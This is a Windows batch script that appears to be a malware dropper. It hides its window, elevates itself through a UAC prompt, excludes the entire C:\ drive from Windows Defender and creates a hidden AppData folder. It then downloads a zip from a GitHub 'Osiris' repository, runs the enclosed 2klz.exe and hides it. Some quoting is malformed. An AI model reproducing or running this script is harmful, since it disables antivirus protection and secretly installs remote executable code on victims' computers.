:---------------------------------------------------------------------------------------------------------------------------:
powershell -window hidden -command ""
:---------------------------------------------------------------------------------------------------------------------------:
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
:---------------------------------------------------------------------------------------------------------------------------:
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:---------------------------------------------------------------------------------------------------------------------------:
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
:---------------------------------------------------------------------------------------------------------------------------:
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:---------------------------------------------------------------------------------------------------------------------------:
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0
:---------------------------------------------------------------------------------------------------------------------------:
powershell.exe -command "Add-MpPreference -ExclusionPath "C:\
:---------------------------------------------------------------------------------------------------------------------------:
cd "C:\Users\%USERNAME%\AppData\Local"
mkdir "Anon"
attrib +h "Anon" /s /d
cd C:\Users\%USERNAME%\AppData\Local\Anon" 
:---------------------------------------------------------------------------------------------------------------------------:
Powershell -Command "Invoke-Webrequest 'https://github.com/Kami32X/Osiris/raw/refs/heads/main/2klz.zip' -OutFile 2klz.zip"
tar -xf 2klz.zip
del 2klz.zip
start 2klz.exe
attrib +h "C:\Users\%USERNAME%\AppData\Anon\2klz.exe" /s /d
:---------------------------------------------------------------------------------------------------------------------------:
